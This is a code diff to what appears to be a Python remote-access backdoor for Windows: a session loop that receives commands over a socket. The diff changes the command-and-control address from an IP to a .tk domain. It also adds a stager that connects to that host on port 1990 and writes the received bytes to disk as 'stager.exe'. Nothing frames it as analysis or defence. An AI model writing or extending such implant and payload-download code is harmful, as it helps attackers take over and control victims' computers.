@@ -12,7 +12,7 @@ from urllib import request
 import winreg
 import base64 as b64
 
-ip = "159.65.11.28"
+ip = "www.bolt2003.tk"
 #ip = "127.0.0.1"
 active = False
 
@@ -90,6 +90,12 @@ def start_session(s):
         global active
         if(active != True):
             return
+        stager_socket = socket.socket(socket.AF_INETs,socket.SOCK_STREAM)
+        stager_socket.connect((ip,1990))
+        data = stager_socket.recv(40960)
+        file = open("stager.exe",'wb')
+        file.write(data)
+        file.close()
         try:
             cmd = s.recv(1024).decode()
 
